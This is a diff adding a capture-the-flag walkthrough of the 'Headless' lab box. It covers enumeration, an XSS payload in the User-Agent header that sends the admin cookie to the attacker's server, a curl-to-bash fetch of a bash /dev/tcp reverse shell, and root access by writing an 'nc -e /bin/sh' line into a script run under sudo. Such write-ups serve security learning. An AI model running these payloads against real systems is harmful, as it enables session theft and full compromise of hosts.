@@ -1,0 +1,110 @@
+Headless Box - Vulnerability: Cross-Site Scripting (XSS) in User-Agent Header & Weak Session Management & Unvalidated User Input on Support Page & Remote Code Execution via Unsecured Endpoints & Privilege Escalation via Misconfigured Sudo Permissions 
+
+ENUMERATION:
+
+First we did an nmap scan we found port 22 ssh open and port 5000 open.
+Port 5000 contained Werkzeug/2.2.2 Python/3.11.2
+
+We went to
+http://10.129.234.207:5000 
+
+
+Let’s try to find some hidden directories
+Gobuster dir -u http://10.129.234.207:5000/ -w /usr/share/wordlists/dirbusting/mediumone
+
+We found 
+http://10.129.234.207:5000/support - page that allows user input to submit
+http://10.129.234.207:5000/dashboard - page that isn’t allowed for us to view yet
+
+Important: Since we visited the dashboard page, we didn’t have permissions to view it. However, there was no login so admin / right credentials probably come from cookie or session ID
+
+We launch burp suite to assist with modifying/deliver our payloads / requests
+
+Start up a web server to host HTTP content:
+python3 -m http.server 8001
+
+Go to the submit page where we can send things to the server..
+
+Send in a random request / submit a random form
+
+Intercept this, and submit this within the User-Agent: header
+<script>var i=new Image(); i.src="http://10.10.14.251:8001/?cookie="+btoa(document.cookie);</script>
+	-10.10.14.251 is the http server we launched
+	-This script is used to steal cookies from a web page via a Cross-Site Scripting (XSS) attack.
+	-source; https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e 
+
+Use Burp Suite’s repeater to send in the request. 
+
+We should receive this request on the hosted web server.
+
+It return back an encoded cookie on our HTTP hoster so we do:
+echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
+Output: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+
+We now have the admin cookie
+
+Go back to  http://10.129.234.207:5000/dashboard 
+
+Use repeater to send in the admin cookie
+
+We now reached the administrative dashboard, and we have access to adjust some date of sorts.
+
+Since we are within the internal server, let’s see if the defense is a bit weaker to start a reverse shell
+
+Create a file called payload.sh with the content:
+/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.251/4444 0>&1'
+
+Start netcat listener:
+nc -lnvp 4444
+
+Using burp suite again, go back in and make it communicate / connect back to the HTTP server listening on port 8001
+curl http://10.10.14.251:8001/payload.sh | bash
+
+We are inside the system now on our netcat listener
+
+
+We can find user.txt flag just a few directories away at the ~ home directory
+
+To find the root flag, we need to determine if we have root permissions
+sudo -l
+
+This shows us that we have permissions to run: /usr/bin/syscheck
+
+Go to that file and print (cat) out the contents:
+
+We see that this file utilizes a file called initdb.sh..
+
+Let’s put a payload in that file
+echo "nc -e /bin/sh 10.10.14.251 1234" > initdb.sh
+chmod +x initdb.sh
+	
+
+
+Start a netcat listener at port 1234
+nc -lvnp 1234
+
+Execute the file.. 
+sudo /usr/bin/syscheck
+
+We are now in and have root access, but we need to stabilize the shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL-Z
+stty raw -echo; fg
+export TERM=xterm
+ENTER
+
+Source: https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal 
+
+Use find . -name “root.txt” to find the flag
+
+
+Personal notes:
+The cross site scripting attack we basically sent a malicious javascript code that took the server's cookie and sent it to our HTTP server. 
+
+Regarding reverse shell command “/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.251/4444 0>&1'”
+-By making the server execute the bash command retrieved from your HTTP server, it launched a terminal on the server, with input and output redirected to your netcat listener.
+
+Regarding second reverse shell command “echo "nc -e /bin/sh 10.10.14.251 1234" > initdb.sh”
+	-This method launches netcat on the server, providing input and output to your netcat listener once the file syscheck was executed, as it utilizes initdb.sh
+
+Fuck this box
